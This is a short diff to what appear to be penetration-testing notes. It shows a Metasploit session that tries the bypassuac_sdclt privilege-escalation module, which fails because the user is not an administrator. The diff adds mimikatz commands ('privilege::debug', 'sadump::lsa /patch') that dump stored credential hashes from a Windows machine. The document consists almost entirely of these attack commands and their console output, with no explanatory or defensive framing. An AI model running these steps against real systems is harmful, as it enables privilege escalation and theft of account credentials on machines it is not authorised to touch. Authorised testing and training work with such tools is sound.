@@ -13,3 +13,11 @@ msf exploit(multi/handler) > use exploit/windows/local/bypassuac_sdclt
 msf exploit(windows/local/bypassuac_sdclt) > set SESSION 1
 msf exploit(windows/local/bypassuac_sdclt) > exploit
 [-] Exploit aborted due to failure: no-access: Not in admins group, cannot escalate with this module
+
+
+mimikatz
+
+privilege::debug
+
+sadump::lsa /patch
+
